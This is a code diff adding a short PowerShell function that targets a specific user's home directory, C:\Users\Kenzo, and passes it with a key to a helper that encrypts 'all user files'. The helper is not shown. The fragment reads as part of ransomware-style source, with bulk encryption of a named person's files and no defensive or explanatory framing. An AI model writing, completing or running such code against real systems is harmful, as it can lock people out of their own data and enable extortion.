@@ -1,0 +1,12 @@
+function Encrypt-Kenzo-Directory {
+    param (
+        [byte[]]$Key
+    )
+    $DirectoryPath = "C:\Users\Kenzo"
+    if (Test-Path -Path $DirectoryPath) {
+        Write-Host "Encrypting all user files in: $DirectoryPath"
+        Scan-And-Encrypt-Directory -DirectoryPath $DirectoryPath -Key $Key
+    } else {
+        Write-Host "Target directory does not exist: $DirectoryPath"
+    }
+}
